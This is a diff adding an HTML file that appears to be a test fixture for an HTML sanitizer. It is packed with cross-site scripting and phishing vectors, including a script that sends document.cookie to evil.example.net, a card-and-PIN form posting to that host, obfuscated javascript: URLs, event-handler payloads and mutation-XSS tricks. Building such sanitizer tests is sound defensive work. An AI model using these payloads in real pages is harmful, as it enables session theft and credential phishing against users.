@@ -1,0 +1,44 @@
+<html>
+<head>
+<base href="https://evil.example.net/">
+<meta http-equiv="refresh" content="0; url=https://evil.example.net/landing">
+<script>document.location='https://evil.example.net/?c='+document.cookie</script>
+<script src="https://evil.example.net/x.js"></script>
+</head>
+<body onload="alert('body')">
+<p>Dear customer, please confirm your details.</p>
+<img src="x" onerror="alert('onerror')">
+<img src="https://cdn.example.net/ok.png" width="200" height="80" onload="track()" alt="banner">
+<a href="javascript:alert('js')">javascript link</a>
+<a href="JaVaScRiPt:alert('mixed case')">mixed case</a>
+<a href="jav&#x09;ascript:alert('tab')">entity tab</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">entity encoded</a>
+<a href="vbscript:msgbox(1)">vbscript</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data html link</a>
+<a href="relative/path">relative</a>
+<a href="https://example.com/ok" onclick="steal()" onmouseover="steal()">ok link with handlers</a>
+<iframe src="https://evil.example.net/frame"></iframe>
+<object data="https://evil.example.net/x.swf"></object>
+<embed src="https://evil.example.net/x.swf">
+<svg onload="alert('svg')"><script>alert('svg script')</script><a xlink:href="javascript:alert(1)"><text>svg text</text></a></svg>
+<math><mtext><img src=x onerror=alert('math')></mtext></math>
+<form action="https://evil.example.net/collect" method="post">
+  <p>Card number: <input name="cc" type="text"> PIN: <input name="pin" type="password"></p>
+  <button type="submit">Verify</button>
+</form>
+<noscript><p title="</noscript><img src=x onerror=alert('mxss')>"></p></noscript>
+<template><img src=x onerror=alert('template')></template>
+<!--><img src=x onerror=alert('comment')>-->
+<p style="position:fixed;top:0;left:0;width:100%;height:100%;background:white">overlay</p>
+<p style="width: expression(alert('ie'))">ie expression</p>
+<p style="background:url('javascript:alert(1)')">css js url</p>
+<p style="behavior:url(x.htc);-moz-binding:url(https://evil.example.net/x.xml#x)">bindings</p>
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+" alt="svg data">
+<img src="data:text/html,<script>alert(1)</script>" alt="html data">
+<details open ontoggle="alert('toggle')"><summary>More</summary>hidden</details>
+<video src="https://evil.example.net/v.mp4" poster="https://evil.example.net/poster.jpg"></video>
+<marquee onstart="alert(1)">marquee text</marquee>
+<isindex action="javascript:alert(1)">
+<table background="https://evil.example.net/bg.png"><tr><td>bg table</td></tr></table>
+</body>
+</html>
